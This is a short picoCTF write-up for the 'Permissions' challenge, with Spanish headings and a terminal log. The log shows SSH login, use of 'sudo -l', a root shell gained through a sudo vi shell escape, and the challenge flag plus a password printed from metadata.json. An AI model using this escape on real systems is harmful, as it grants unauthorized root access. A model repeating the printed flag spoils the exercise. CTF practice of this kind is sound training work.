## Descripción 
Can you read files in the root file?

Additional details will be available after launching your challenge instance.
## Datos de Acceso al Nivel
user: carlosof
password:

## Solución
```bash
carlosof-picoctf@webshell:~$ ssh -p 58814 picoplayer@saturn.picoctf.net
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Sep 16 19:58:38 2024 from 3.140.102.47
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi -c ':!/bin/sh' /dev/null

# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# ls
# pwd
/home/picoplayer
# cd /
# ls
bin   challenge  etc   lib    lib64   media  opt   root  sbin  sys  usr
boot  dev        home  lib32  libx32  mnt    proc  run   srv   tmp  var
# cd challenge
# ls
metadata.json
# cat metadata.json
{"flag": "picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}", "username": "picoplayer", "password": "NBD+zO8s4y"}# 
```

## Notas Adicionales

## Referencias 
https://play.picoctf.org/practice/challenge/363
[Permissions | picoCTF 2023 Writeups (meghmistry.com)](https://picoctf2023.meghmistry.com/general-skills/permissions)